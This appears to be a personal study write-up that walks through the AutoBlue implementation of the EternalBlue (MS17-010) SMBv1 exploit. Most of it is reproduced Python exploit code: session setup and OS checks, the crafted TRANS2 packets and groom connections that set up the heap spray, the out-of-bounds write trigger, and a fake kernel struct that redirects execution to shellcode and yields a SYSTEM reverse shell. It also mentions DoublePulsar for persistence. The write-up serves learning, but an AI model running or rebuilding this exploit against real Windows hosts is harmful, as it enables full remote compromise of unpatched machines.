# MS17-010-HighlevelWriteup
A high level writeup of the Eternal Blue (MS17-010) exploit using code from AutoBlue

# Eternal Blue writeup

###### This is a very high level writeup on how AutoBlue works, written to help me understand how EternalBlue works at a high level.
### 1. Connect to the target
- We use a request to initiate communication and then we send a followup request to authenticate the session.
- The authentication request is usually as Guest.
    - In AutoBlue, we can see this in the exploit function on line 482:
        ```
        conn = smb.SMB(target, target)
        conn.login(USERNAME, PASSWORD)
        ```
        - Where USERNAME and PASSWORD were defined back on lines 83 and 84.
        - ```target``` is the IP of the target machine.
    - Its also noted that after these lines in the exploit function, the operating system is checked.
        ```
        server_os = conn.get_server_os()
    	print('Target OS: '+server_os)
    	if server_os.startswith("Windows 10 "):
    		build = int(server_os.split()[-1])
    		if build >= 14393:  # version 1607
    			print('This exploit does not support this target')
    			sys.exit()
    	elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
    		print('This exploit does not support this target')
    		sys.exit()
        ```
### 2. Heap Spray
- TRANS request packets are specially and carfully crafted and sent to the target.
    ```
    # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
	progress = send_big_trans2(conn, tid, 0, feaList, b'\x00'*30, len(feaList)%4096, False)
	# Another TRANS2_OPEN2 (0) with special feaList for disabling NX
	nxconn = smb.SMB(target, target)
	nxconn.login(USERNAME, PASSWORD)
	nxtid = nxconn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	nxprogress = send_big_trans2(nxconn, nxtid, 0, feaListNx, b'\x00'*30, len(feaList)%4096, False)

    ```
- On lines 395-410 in the send_big_trans2 function, we can see these packets being created.
     ```
    pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid
	command = pack('<H', setup)

	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)
    fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = b'\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

    transCommand['Parameters']['DataCount'] = firstDataFragmentSize
    transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len
    
    transCommand['Data']['Trans_Parameters'] = param
    transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
    pkt.addCommand(transCommand)
    ```
    
- These packets are sent to the target. 
    ```
    conn.sendSMB(pkt)
    ```
- These packets allocate large chunks of memory on the heap.
- We send many connections (also called “groom connections”) to the target.
    ```
    def createConnectionWithBigSMBFirst80(target, for_nx=False):
    	sk = socket.create_connection((target, 445))
    	pkt = b'\x00' + b'\x00' + pack('>H', 0x8100)
    	# There is no need to be SMB2 because we want the target free the corrupted buffer.
    	# Also this is invalid SMB2 message.
    	# I believe NSA exploit use SMB2 for hiding alert from IDS
    	#pkt += '\xfeSMB' # smb2
    	# it can be anything even it is invalid
    	pkt += b'BAAD' # can be any
    	if for_nx:
    		# MUST set no delay because 1 byte MUST be sent immediately
    		sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    		pkt += b'\x00'*0x7b  # another byte will be sent later to disabling NX
    	else:
    		pkt += b'\x00'*0x7c
    	sk.send(pkt)
    	return sk
	
    srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
		srvnetConn.append(sk)
    ```
    - Because these packets are crafted so carefully and have controlled sizes, we end up with a predictable memory structure.
### 3. Buffer overflow and out-of-bounds write
- Once the heap is full, a final malformed TRANS2_SECONDARY packet is sent, which then triggers the vulnerability.
    ```
    # send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	# first trigger, overwrite srvnet buffer struct for disabling NX
	send_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)
	recvPkt = nxconn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	if retStatus == 0xc000000d:
		print('good response status for nx: INVALID_PARAMETER')
	else:
		print('bad response status for nx: 0x{:08x}'.format(retStatus))
		
	# one of srvnetConn struct header should be modified
	# send '\x00' to disable nx
	for sk in srvnetConn:
		sk.send(b'\x00')
	
	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	# second trigger, place fake struct and shellcode
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
    ```
    - This packet specifies a data count thats larger than the actual SMB buffer size causing and overflow and out-of-bounds write to occur
    - This overflow actually overwrites function pointer or SMB message structures, giving us a section of memory to execute code.
    - The exploit actually targets specific regions of memory where function calls or SMB message descriptors are stored.
### 4. Inject and execute custom shellcode on the target
- We send a packet that has our embeded shellcode
    ```
    # fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()
    # x64: fake struct is at ffffffff ffd00e00
    #   offset 0x50:  KSPIN_LOCK
    #   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.
    #   offset 0x110: array of pointer to function
    #   offset 0x13c: set to 3 (DWORD) for invoking ptr to function
    # some useful offset
    #   offset 0x120: arg1 when invoking ptr to function
    #   offset 0x128: arg2 when invoking ptr to function
    #
    # code path to get code exection after this struct is controlled
    # SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
    fake_recv_struct = (b'\x00'*16)*5
    fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x58)  # offset 0x50: KSPIN_LOCK, (LIST_ENTRY to itself)
    fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x58, 0)  # offset 0x60
    fake_recv_struct += (b'\x00'*16)*10
    fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x170, 0)  # offset 0x110: fn_ptr array
    fake_recv_struct += pack('<QQ', (0x8150^0xffffffffffffffff)+1, 0)  # set arg1 to -0x8150
    fake_recv_struct += pack('<QII', 0, 0, 3)  # offset 0x130
    fake_recv_struct += (b'\x00'*16)*3
    fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x180)  # shellcode address
    
    # one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode
	for sk in srvnetConn:
		sk.close()
    ```
    - After the functions are overwritten, they point right to our shellcode for execution
### 5. Reverse shell
- Since the SMBv1 service is running in kernel mode, se are left with a reverse shell on the target that has NT AUTHORITY\SYSTEM priveleges.

## Final thoughts
- Although this exploit uses a very common and realatively simple buffer overflow, what makes this complex is using the crafted packets to perform the buffer overflow.
- Another very advanced method is the heap spraying and grooming
    - This vulnerability is susceptible to system crashes, giving away its covertness. With this method, we have control over the packets and the amount of memory we are allocating
- This exploit is so powerful because the SMBv1 service is running in kernal mode on ring-0, meaning that when its done, we have complete and total control over the target
- This exploit works across multiple systems
    - The SMB protocol uses slightly different packets and addresses, so implementing this accross different versions of windows is hard work
- Another topic not discussed is persistance. We can integrate "Double Pulsar" post exploit to keep our access to the machine.

